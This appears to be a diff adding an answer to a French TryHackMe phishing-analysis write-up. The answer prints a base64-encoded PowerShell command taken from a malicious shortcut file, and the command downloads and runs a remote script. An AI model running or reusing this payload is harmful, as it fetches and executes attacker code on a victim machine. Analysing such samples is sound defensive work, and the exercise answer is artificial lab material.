@@ -56,6 +56,11 @@ Le mot de passe est écrit dans le mail : Invoice2023!
 
 6 - D'après le résultat de l'outil lnkparse, quelle est la charge utile encodée présente dans le champ « Command Line Arguments » ?
 
+On utilise la commande lnkparse Invoice_20230103.lnk et on récupére la chaine en base64 :
+
+![Tryhackme](00-Images/lnkbase64.png)
+
+réponse : aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA
 
 
 
